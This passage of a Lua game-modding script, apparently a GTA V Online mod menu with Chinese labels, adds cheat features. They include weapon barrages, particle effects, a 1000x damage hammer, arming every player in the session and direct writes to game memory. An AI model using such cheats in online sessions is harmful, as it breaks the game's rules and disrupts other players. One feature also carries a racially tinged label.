    scope_scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE('REMOTE_SNIPER_HUD')
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scope_scaleform, 'REMOTE_SNIPER_HUD')
    GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scope_scaleform, 255, 255, 255, 255, 0)
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    local barrageInput = 'INPUT_PICKUP'
    if not PAD._IS_USING_KEYBOARD(0) then
        barrageInput = 'INPUT_COVER'
    end
    memory.write_int(memory.script_global(1649593 + 1163), 1)
    SFasd.CLEAR_ALL()
    SFasd.TOGGLE_MOUSE_BUTTONS(false)
    SFasd.SET_DATA_SLOT(2, JSkey.get_control_instructional_button(0, 'INPUT_ATTACK'), '机炮')
    SFasd.SET_DATA_SLOT(1, JSkey.get_control_instructional_button(0, 'INPUT_AIM'), '原子枪')
    SFasd.SET_DATA_SLOT(0, JSkey.get_control_instructional_button(0, barrageInput), '火箭弹')
    SFasd.DRAW_INSTRUCTIONAL_BUTTONS()
    JSkey.disable_control_action(2, 'INPUT_VEH_MOUSE_CONTROL_OVERRIDE')
    JSkey.disable_control_action(2, 'INPUT_VEH_FLY_MOUSE_CONTROL_OVERRIDE')
    JSkey.disable_control_action(2, 'INPUT_VEH_SUB_MOUSE_CONTROL_OVERRIDE')
    JSkey.disable_control_action(0, 'INPUT_ATTACK')
    JSkey.disable_control_action(0, 'INPUT_AIM')
    if not (JSkey.is_disabled_control_pressed(0, 'INPUT_ATTACK') or JSkey.is_disabled_control_pressed(0, 'INPUT_AIM') or JSkey.is_disabled_control_pressed(0, barrageInput)) then return end
    local a = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local b = getOffsetFromCam(80)
    local hash
    if JSkey.is_disabled_control_pressed(0, 'INPUT_ATTACK') then
        hash = util.joaat('VEHICLE_WEAPON_PLAYER_LAZER')
        if not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) then
            WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 26)
            while not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) do
                util.yield()
            end
        end
    elseif JSkey.is_disabled_control_pressed(0, 'INPUT_AIM') then
        hash = util.joaat('WEAPON_RAYPISTOL')
        if not WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), hash, false) then
            WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 9999, false, false)
        end
    else
        hash = util.joaat('WEAPON_RPG')
        if not WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), hash, false) then
            WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 9999, false, false)
        end
        a.x += math.random(0, 100) / 100
        a.y += math.random(0, 100) / 100
        a.z += math.random(0, 100) / 100
    end
    WEAPON.SET_CURRENT_PED_WEAPON(players.user_ped(), util.joaat('WEAPON_UNARMED'), true)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
        a.x, a.y, a.z,
        b.x, b.y, b.z,
        200,
        true,
        hash,
        PLAYER.PLAYER_PED_ID(),
        true, true, -1.0
    )
end, function()
    if gaveHelmet then
        PED.REMOVE_PED_HELMET(players.user_ped(), true)
        gaveHelmet = false
    end
    HUD._HUD_WEAPON_WHEEL_IGNORE_CONTROL_INPUT(false)
    local pScaleform = memory.alloc_int()
    memory.write_int(pScaleform, scope_scaleform)
    GRAPHICS.SET_SCALEFORM_MOVIE_AS_NO_LONGER_NEEDED(pScaleform)
    menu.trigger_commands("levitate off")
    util.yield()
    CAM.SET_CAM_VIEW_MODE_FOR_CONTEXT(CAM._GET_CAM_ACTIVE_VIEW_MODE_CONTEXT(), startViewMode)
    startViewMode = nil
end)

new = {}
function firewingcolours(colours)
fireWingsSettingse.colour = colour
end
function new.colour(R, G, B, A)
    return {r = R / 255, g = G / 255, b = B / 255, a = A or 1}
end
function loadModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end
end
 fireWingse = {
[1] = {pos = {[1] = 100, [2] =  50}},
[2] = {pos = {[1] = 100, [2] = -50}},
[3] = {pos = {[1] = 115, [2] =  50}},
[4] = {pos = {[1] = 115, [2] = -50}},
[5] = {pos = {[1] = 160, [2] =  50}},
[6] = {pos = {[1] = 160, [2] = -50}},
[7] = {pos = {[1] = 170, [2] =  50}},
[8] = {pos = {[1] = 170, [2] = -50}},
[9] = {pos = {[1] = 110, [2] =  50}},
[10] = {pos = {[1] = 110, [2] = -50}},
[11] = {pos = {[1] = 120, [2] =  50}},
[12] = {pos = {[1] = 120, [2] = -50}},
[13] = {pos = {[1] = 130, [2] =  50}},
[14] = {pos = {[1] = 130, [2] = -50}},
[15] = {pos = {[1] = 190, [2] =  50}},
[16] = {pos = {[1] = 190, [2] = -50}},
[17] = {pos = {[1] = 175, [2] =  50}},
[18] = {pos = {[1] = 175, [2] = -50}},
[19] = {pos = {[1] = 140, [2] =  50}},
[20] = {pos = {[1] = 140, [2] = -50}},
[21] = {pos = {[1] = 150, [2] =  50}},
[22] = {pos = {[1] = 150, [2] = -50}},
[23] = {pos = {[1] = 180, [2] =  50}},
[24] = {pos = {[1] = 180, [2] = -50}},
}
local mildOrangeFires = new.colour( 60, 255, 255 )
fireWingsSettingse = {
scalee = 1,
colour = mildOrangeFires,
on = false,
y = { value = 0.12, still = 0.12, walk =  0.22, sprint = 0.32, sneak = 0.35 },
z = { value = 0.58, still = 0.58, walk =  0.45, sprint = 0.38, sneak = 0.35 },
}
colour = new.colour( 255, 0, 255 )
fireWingsSettingse.colour = colour
local ptfxEgg
menu.toggle(fun, "火翅膀",{""}, "",function(toggle)
fireWingsSettingse.on = toggle
if fireWingsSettingse.on then
 ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 1, false)
if ptfxEgg == nil then
local eggHash = 1803116220
loadModel(eggHash)
ptfxEgg = entities.create_object(eggHash, ENTITY.GET_ENTITY_COORDS(players.user_ped()))
ENTITY.SET_ENTITY_COLLISION(ptfxEgg, false, false)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(eggHash)
end
for i = 1, #fireWingse do
while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
util.yield()
end
GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
fireWingse[i].ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY('muz_xs_turret_flamethrower_looping', ptfxEgg, 0, 0, 0, fireWingse[i].pos[1], 0, fireWingse[i].pos[2], fireWingsSettingse.scalee, false, false, false)
util.create_tick_handler(function()
local rot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)
ENTITY.ATTACH_ENTITY_TO_ENTITY(ptfxEgg, players.user_ped(), -1, 0, 0, 0.2, rot.x, rot.y, rot.z, false, false, false, false, 0, false)
ENTITY.SET_ENTITY_ROTATION(ptfxEgg, rot.x, rot.y, rot.z, 2, true)
for i = 1, #fireWingse do
GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireWingse[i].ptfx, fireWingsSettingse.scalee)
GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireWingse[i].ptfx, fireWingsSettingse.colour.r, fireWingsSettingse.colour.g, fireWingsSettingse.colour.b)
end
ENTITY.SET_ENTITY_VISIBLE(ptfxEgg, false)
return fireWingsSettingse.on
end)
end
else
for i = 1, #fireWingse do
if fireWingse[i].ptfx then
GRAPHICS.REMOVE_PARTICLE_FX(fireWingse[i].ptfx, true)
fireWingse[i].ptfx = nil
end
if ptfxEgg then
entities.delete_by_handle(ptfxEgg)
ptfxEgg = nil
end
end
STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
end
end)

menu.toggle_loop(fun, "炫酷特效V1", {""}, "蓝", function()
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("scr_sum2_hal")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
"scr_sum2_hal_rider_weak_blue", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2, false, false, false)
end)

menu.toggle_loop(fun, "炫酷特效V2", {""}, "绿", function()
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("scr_sum2_hal")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
"scr_sum2_hal_rider_weak_green", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2, false, false, false)
end)

menu.toggle_loop(fun, "炫酷特效V3", {""}, "黄", function()
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("scr_sum2_hal")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
"scr_sum2_hal_rider_weak_orange", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2, false, false, false)
end)

menu.toggle_loop(fun, "炫酷特效V4", {""}, "白", function()
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("scr_sum2_hal")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
"scr_sum2_hal_rider_weak_greyblack", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2, false, false, false)
end)

menu.toggle(fun, "特斯拉自动驾驶", {}, "", function(toggled)
    local ped = players.user_ped()
    local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    local tesla_ai = util.joaat("u_m_y_baygor")
    local tesla = util.joaat("raiden")
    request_model(tesla_ai)
    request_model(tesla)
    if toggled then     
       if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            menu.trigger_commands("deletevehicle")
        end

        tesla_ai_ped = entities.create_ped(26, tesla_ai, playerpos, 0)
        tesla_vehicle = entities.create_vehicle(tesla, playerpos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(tesla_ai_ped, true) 
        ENTITY.SET_ENTITY_VISIBLE(tesla_ai_ped, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(tesla_ai_ped, true)
        PED.SET_PED_INTO_VEHICLE(ped, tesla_vehicle, -2)
        PED.SET_PED_INTO_VEHICLE(tesla_ai_ped, tesla_vehicle, -1)
        PED.SET_PED_KEEP_TASK(tesla_ai_ped, true)
        VEHICLE.SET_VEHICLE_COLOURS(tesla_vehicle, 111, 111)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 23, 8, false)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 15, 1, false)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(tesla_vehicle, 111, 147)
        menu.trigger_commands("performance")

        if HUD.IS_WAYPOINT_ACTIVE() then
            local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
            TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(tesla_ai_ped, tesla_vehicle, pos.x, pos.y, pos.z, 20.0, 786603, 0)
        else
            TASK.TASK_VEHICLE_DRIVE_WANDER(tesla_ai_ped, tesla_vehicle, 20.0, 786603)
        end
    else
        if tesla_ai_ped ~= nil then 
            entities.delete_by_handle(tesla_ai_ped)
        end
        if tesla_vehicle ~= nil then 
            entities.delete_by_handle(tesla_vehicle)
        end
    end
end)


local randomizer = function(x)
    local r = math.random(1,3)
    return x[r]
end

array = {"1","1","2"}



menu.action(fun, "雪球战争", {}, "", function ()
    local plist = players.list()
    local snowballs = util.joaat('WEAPON_SNOWBALL')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, snowballs, 20, true)
        WEAPON.SET_PED_AMMO(plyr, snowballs, 20)
        util.toast("现在每个人都有雪球了")
        util.yield()
    end
   
end)

local bigbarrelqq = false
        menu.toggle(fun, "大招牌", {"bighammer"}, "", function(on)
            if on then
                WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
                dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_beer_neon_01"), pos.x, pos.y, pos.z, true, true, false)--prop_gate_farm_post
                tongzi = OBJECT.CREATE_OBJECT(util.joaat(""), pos.x, pos.y, pos.z, true, true, false)--h4_prop_h4_barrel_01a
                menu.trigger_commands("damagemultiplier 1000")
                menu.trigger_commands("rangemultiplier 1.5")
                ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(tongzi,dachui, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true)
                util.yield(1000)
                bigbarrelqq = on
            else
                menu.trigger_commands("damagemultiplier 1")
                menu.trigger_commands("rangemultiplier 1")
                entities.delete_by_handle(dachui)
                entities.delete_by_handle(tongzi)
                bigbarrelqq = off
                WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
            end
        end,false)
        bigbigbig = false
        menu.toggle(fun, "大锤", {"bighammer"}, "", function(on)
            if on then
                WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
                dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_bollard_02a"), pos.x, pos.y, pos.z, true, true, false)
                tongzi = OBJECT.CREATE_OBJECT(util.joaat("prop_barrel_02a"), pos.x, pos.y, pos.z, true, true, false)
                menu.trigger_commands("damagemultiplier 1000")
                menu.trigger_commands("rangemultiplier 1.5")
                ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(tongzi,dachui, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true)
                util.yield(1000)
                bigbigbig = on
            else
                menu.trigger_commands("damagemultiplier 1")
                menu.trigger_commands("rangemultiplier 1")
                entities.delete_by_handle(dachui)
                entities.delete_by_handle(tongzi)
                bigbigbig = off
                WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
            end
        end,false)
        
    
        local bones <const> = {
            0x49D9,	-- left hand
            0xDEAD,	-- right hand
            0x3779,	-- left foot
            0xCC4D	-- right foot
        }
        ----创建PED(鲨鱼枪,黑人抬棺,)
function Cped(type, hash, pos, dir)
    request_model(hash, 300)
    local ped = entities.create_ped(type, hash, pos, dir, true, false)
    STREAMING.REQUEST_MODEL(hash)
    return ped
end
----黑人抬棺
function get_control_of_entity(h, t)
    if not h then 
      return
    end
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(h) then
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(h)
        local time = os.time() + t
        while ENTITY.IS_AN_ENTITY(h) and not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(h) and time > c.time() do
             util.yield(5)
        end
    end
    return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(h)
end
function blacks_coffins()
    local pos = players.get_position(players.user())
    local pedp = players.user_ped()
    pos.z = pos.z + 0.6

    coffin = OBJECT.CREATE_OBJECT(2193278353, pos.x, pos.y, pos.z, true, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(coffin, pedp, 0, 0, 0, 0.8, 0.0, 0, 0.0, true, true, false, 0, true)

    npc1 = Cped(26,0x9B22DBAF,pos,0)
    get_control_of_entity(npc1,300)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(npc1,coffin, 0, 0.55,0,-0.6,0.0,0,0.0, true, true, false, 0, true)
    ENTITY.FREEZE_ENTITY_POSITION(npc1, true)

    get_control_of_entity(npc2,300)
    npc2 = Cped(26,0x9B22DBAF,pos,0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(npc2,coffin, 0, -0.55,0,-0.6,0.0,0,0.0, true, true, false, 0, true)
    ENTITY.FREEZE_ENTITY_POSITION(npc2, true)

    get_control_of_entity(npc3,300)
    npc3 = Cped(26,0x9B22DBAF,pos,0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(npc3,coffin, 0, 0.55,0.5,-0.6,0.0,0,0.0, true, true, false, 0, true)
    ENTITY.FREEZE_ENTITY_POSITION(npc3, true)

    get_control_of_entity(npc4,300)
    npc4 = Cped(26,0x9B22DBAF,pos,0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(npc4,coffin, 0, -0.55,0.5,-0.6,0.0,0,0.0, true, true, false, 0, true)
    ENTITY.FREEZE_ENTITY_POSITION(npc4, true)

    get_control_of_entity(npc5,300)
    npc5 = Cped(26,0x9B22DBAF,pos,0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(npc5,coffin, 0, 0.55,-0.5,-0.6,0.0,0,0.0, true, true, false, 0, true)
    ENTITY.FREEZE_ENTITY_POSITION(npc5, true)

    get_control_of_entity(npc6,300)
    npc6 = Cped(26,0x9B22DBAF,pos,0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(npc6,coffin, 0, -0.55,-0.5,-0.6,0.0,0,0.0, true, true, false, 0, true)
    ENTITY.FREEZE_ENTITY_POSITION(npc6, true)
end

        menu.toggle(fun, "黑人抬棺", {}, "", function ()
            blacks_coffins()
        end)
        ----罪城的水
function VicecityWater()
    if ENTITY.IS_ENTITY_IN_WATER(players.user_ped()) and not PED.IS_PED_DEAD_OR_DYING(players.user_ped()) then
        menu.trigger_commands("ewo")
    end
end
        menu.toggle(fun, "罪城的水", {""}, "碰水就死", function()
            VicecityWater()
        end)
        ----堆叠行人
function stack_npc()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    all_peds = entities.get_all_peds_as_handles()
    local last_ped = 0
    local last_ped_ht = 0
    for k,ped in pairs(all_peds) do
        if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
            request_control_of_entity(ped)
            if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
            end
    
            ENTITY.DETACH_ENTITY(ped, false, false)
            if last_ped ~= 0 then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, false)
            else
                ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
            end
            last_ped = ped
            last_ped_ht = get_model_size(ENTITY.GET_ENTITY_MODEL(ped)).z
        end
    end
end

        menu.toggle(fun, "雷神",{""}, "",function(state)--heezy
            if state then
                for _, boneId in ipairs(bones) do
                request_ptfx_asset("core")
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_amb_elec_crackle", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)
                end

            else
                GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
        end)
        --------------------------
-- EFFECT
--------------------------

---@class Effect
Effect = {asset = "", name = "", scale = 1.0}
Effect.__index = Effect

---@param asset string
---@param name string
---@param scale? number
---@return Effect
function Effect.new(asset, name, scale)
	local inst = setmetatable({}, Effect)
	inst.name = name
	inst.asset = asset
	inst.scale = scale
	return inst
end
        function personllight()
            local localPed = PLAYER.PLAYER_PED_ID()
            local fect = Effect.new("scr_xm_farm", "scr_xm_dst_elec_crackle")
            local effect = Effect.new("scr_ie_tw", "scr_impexp_tw_take_zone")
            local colour = Colour.new(5, 0, 0, 30)
            local colour2 = Colour.new(5, 50, 10, 30)
            request_fx_asset(effect.asset)
            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
            GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
                effect.name,
                localPed,
                0.0, 0.0, 0.75,
                0.0, 0.0, 0.0,
                0.09,
                false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
            GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour2.r, colour2.g, colour2.b)
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
                effect.name,
                localPed,
                0.0, 0.0, -2.9,
                0.0, 0.0, 0.0,
                1.0,
                false, false, false)
        end
        
        function personllighta()
            local localPed = PLAYER.PLAYER_PED_ID()
            local fect = Effect.new("scr_xm_farm", "scr_xm_dst_elec_crackle")
            local effect = Effect.new("scr_ie_svm_technical2", "scr_dst_cocaine")
            local colour = Colour.new(5, 0, 0, 30)
            local colour2 = Colour.new(5, 50, 10, 30)
            request_fx_asset(effect.asset)
            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
            GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
                effect.name,
                localPed,
                0.0, 0.0, 0.75,
                0.0, 0.0, 0.0,
                0.09,
                false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
            GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour2.r, colour2.g, colour2.b)
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
                effect.name,
                localPed,
                0.0, 0.0, -2.9,
                0.0, 0.0, 0.0,
                1.0,
                false, false, false)
        end
        
        function personllightb()
            local localPed = PLAYER.PLAYER_PED_ID()
            local fect = Effect.new("scr_xm_farm", "scr_xm_dst_elec_crackle")
            local effect = Effect.new("veh_xs_vehicle_mods", "exp_xs_mine_emp")
            local colour = Colour.new(5, 0, 0, 30)
            local colour2 = Colour.new(5, 50, 10, 30)
            request_fx_asset(effect.asset)
            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
            GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
                effect.name,
                localPed,
                0.0, 0.0, -1,
                0.0, 0.0, 0.0,
                0.09,
                false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
            GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour2.r, colour2.g, colour2.b)
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
                effect.name,
                localPed,
                0.0, 0.0, -2.9,
                0.0, 0.0, 0.0,
                1.0,
                false, false, false)
        end
        
        function personllightc()
            local localPed = PLAYER.PLAYER_PED_ID()
            local effect = Effect.new("scr_xs_props", "scr_xs_exp_mine_sf")
            local colour = Colour.new(5, 0, 0, 30)
            local colour2 = Colour.new(5, 50, 10, 30)
            request_fx_asset(effect.asset)
            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
            GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
                effect.name,
                localPed,
                0.0, 0.0, -1,
                0.0, 0.0, 0.0,
                0.09,
                false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
            GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour2.r, colour2.g, colour2.b)
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
                effect.name,
                localPed,
                0.0, 0.0, -2.9,
                0.0, 0.0, 0.0,
                1.0,
                false, false, false)
        end
        ----保护球
local bigasscircle = util.joaat("ar_prop_ar_neon_gate4x_04a")
function Protect_ball(on)
    if on then
        STREAMING.REQUEST_MODEL(bigasscircle)
        while not STREAMING.HAS_MODEL_LOADED(bigasscircle) do
            STREAMING.REQUEST_MODEL(bigasscircle)
            util.yield()
        end
        c1 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
        c2 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
        c3 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
        c4 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
        c5 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
        c6 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
        c7 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
        c8 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
        c9 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
        c10 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
        c11 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
        c12 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
        c13 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
        c14 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
        c15 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
        c16 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
        c17 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
        c18 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
        c19 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
        ENTITY.FREEZE_ENTITY_POSITION(c1, true)
        ENTITY.FREEZE_ENTITY_POSITION(c2, true)
        ENTITY.FREEZE_ENTITY_POSITION(c3, true)
        ENTITY.FREEZE_ENTITY_POSITION(c4, true)
        ENTITY.FREEZE_ENTITY_POSITION(c5, true)
        ENTITY.FREEZE_ENTITY_POSITION(c6, true)
        ENTITY.FREEZE_ENTITY_POSITION(c7, true)
        ENTITY.FREEZE_ENTITY_POSITION(c8, true)
        ENTITY.FREEZE_ENTITY_POSITION(c9, true)
        ENTITY.FREEZE_ENTITY_POSITION(c10, true)
        ENTITY.FREEZE_ENTITY_POSITION(c11, true)
        ENTITY.FREEZE_ENTITY_POSITION(c12, true)
        ENTITY.FREEZE_ENTITY_POSITION(c13, true)
        ENTITY.FREEZE_ENTITY_POSITION(c14, true)
        ENTITY.FREEZE_ENTITY_POSITION(c15, true)
        ENTITY.FREEZE_ENTITY_POSITION(c16, true)
        ENTITY.FREEZE_ENTITY_POSITION(c17, true)
        ENTITY.FREEZE_ENTITY_POSITION(c18, true)
        ENTITY.FREEZE_ENTITY_POSITION(c19, true)
        ENTITY.SET_ENTITY_ROTATION(c2, 0.0, 0.0, 10.0, 1, true)
        ENTITY.SET_ENTITY_ROTATION(c3, 0.0, 0.0, 20.0, 1, true)
        ENTITY.SET_ENTITY_ROTATION(c4, 0.0, 0.0, 30.0, 1, true)
        ENTITY.SET_ENTITY_ROTATION(c5, 0.0, 0.0, 40.0, 1, true)
        ENTITY.SET_ENTITY_ROTATION(c6, 0.0, 0.0, 50.0, 1, true)
        ENTITY.SET_ENTITY_ROTATION(c7, 0.0, 0.0, 60.0, 1, true)
        ENTITY.SET_ENTITY_ROTATION(c8, 0.0, 0.0, 70.0, 1, true)
        ENTITY.SET_ENTITY_ROTATION(c9, 0.0, 0.0, 80.0, 1, true)
        ENTITY.SET_ENTITY_ROTATION(c10, 0.0, 0.0, 90.0, 1, true)
        ENTITY.SET_ENTITY_ROTATION(c11, 0.0, 0.0, 100.0, 1, true)
        ENTITY.SET_ENTITY_ROTATION(c12, 0.0, 0.0, 110.0, 1, true)
        ENTITY.SET_ENTITY_ROTATION(c13, 0.0, 0.0, 120.0, 1, true)
        ENTITY.SET_ENTITY_ROTATION(c14, 0.0, 0.0, 130.0, 1, true)
        ENTITY.SET_ENTITY_ROTATION(c15, 0.0, 0.0, 140.0, 1, true)
        ENTITY.SET_ENTITY_ROTATION(c16, 0.0, 0.0, 150.0, 1, true)
        ENTITY.SET_ENTITY_ROTATION(c18, 0.0, 0.0, 160.0, 1, true)
        ENTITY.SET_ENTITY_ROTATION(c19, 0.0, 0.0, 170.0, 1, true)
        ENTITY.SET_ENTITY_COORDS(players.user_ped(), -75.14637, -818.67236, 326.1751)
    else
        entities.delete_by_handle(c1)
        entities.delete_by_handle(c2)
        entities.delete_by_handle(c3)
        entities.delete_by_handle(c4)
        entities.delete_by_handle(c5)
        entities.delete_by_handle(c6)
        entities.delete_by_handle(c7)
        entities.delete_by_handle(c8)
        entities.delete_by_handle(c9)
